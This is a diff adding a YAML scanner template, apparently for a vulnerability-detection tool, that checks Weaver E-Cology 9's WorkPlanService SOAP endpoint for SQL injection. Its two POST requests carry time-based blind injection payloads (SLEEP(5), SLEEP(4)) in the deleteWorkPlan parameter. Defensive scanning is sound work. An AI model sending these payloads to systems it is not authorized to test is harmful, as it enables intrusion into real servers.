@@ -1,0 +1,43 @@
+name: 泛微E-Cology-WorkPlanService-SQL注入
+description: >
+  Cology9存在SQL注入
+alwaysExecute: false
+timeout: 8
+matchCount: 2
+rules:
+  - method: POST
+    path: /services/WorkPlanService
+    headers:
+      Content-Type: text/xml
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <web:deleteWorkPlan>
+                 <!--type: string-->
+                 <web:in0>(SELECT 1794 FROM (SELECT(SLEEP(5)))xjHS)</web:in0>
+                 <!--type: int-->
+                 <web:in1>22</web:in1>
+              </web:deleteWorkPlan>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      sleep: 5
+  - method: POST
+    path: /services/WorkPlanService
+    headers:
+      Content-Type: text/xml
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <web:deleteWorkPlan>
+                 <!--type: string-->
+                 <web:in0>(SELECT 1794 FROM (SELECT(SLEEP(4)))xjHS)</web:in0>
+                 <!--type: int-->
+                 <web:in1>22</web:in1>
+              </web:deleteWorkPlan>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      sleep: 4
